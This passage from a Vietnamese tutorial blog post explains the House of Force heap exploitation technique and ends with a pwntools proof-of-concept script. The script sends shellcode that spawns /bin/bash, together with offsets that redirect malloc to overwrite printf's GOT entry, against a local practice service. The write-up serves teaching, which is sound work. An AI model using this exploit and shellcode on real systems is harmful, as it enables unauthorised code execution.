<p>Sau đó, ta sẽ yêu cầu cấp phát một lượng byte sao cho malloc sẽ trả về đúng địa chỉ ta cần (GOT, code section, &hellip;), ví dụ ở đây ta sẽ ghi đè lên hàm printf vì sau khi malloc lần cuối chương trình có gọi hàm này.</p>

<p><img src="/assets/hof/hof2.png" alt="GOT table" /></p>

<p>Lần malloc cuối, ta chỉ việc viết đè lên đó bất cứ thứ gì. Tuy nhiên ở chương trình này, địa chỉ GOT của hàm printf không chia hết cho 8, trong khi hàm malloc luôn trả về một số nguyên 4 byte chia hết cho 8, nên ta phải thêm padding vào trước đó</p>

<h1>Proof of Concept</h1>

<pre><code class="python">from pwn import *

s = remote("localhost", 1928)

shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"
nops = "\x90" * (260 - len(shellcode))
max_size = 0xffffffff
offset = 0x804a00c - 8 - 0x804b110
dummy = 0xdeadbeaf
new_request = 256
first_heap = 0x804b008

payload = ""
payload += shellcode + nops + p32(max_size) + "\n"
payload += str(offset) + "\n" + p32(dummy) + "\n"
payload += str(new_request) + "\n" + p32(dummy) + p32(first_heap)

s.send(payload)
s.interactive()
</code></pre>

<p><strong><em>Chú ý</em></strong>: Khi lấy địa chỉ để hàm malloc trả về, ta phải trừ đi 0x8 byte do metadata của heap. Cũng chính vì lấy đi 0x8 byte nên phương thức này sẽ làm hỏng 2 địa chỉ liền kề địa chỉ ta cần lấy. Ví dụ nếu ta điền vào bảng GOT, HoF sẽ làm hỏng 2 hàm liên tiếp trên đó, nên chương trình có thể sẽ bị SIGSEV trước khi đến được nơi ta khai thác lỗ hổng</p>
]]></content>
  </entry>
  
</feed>
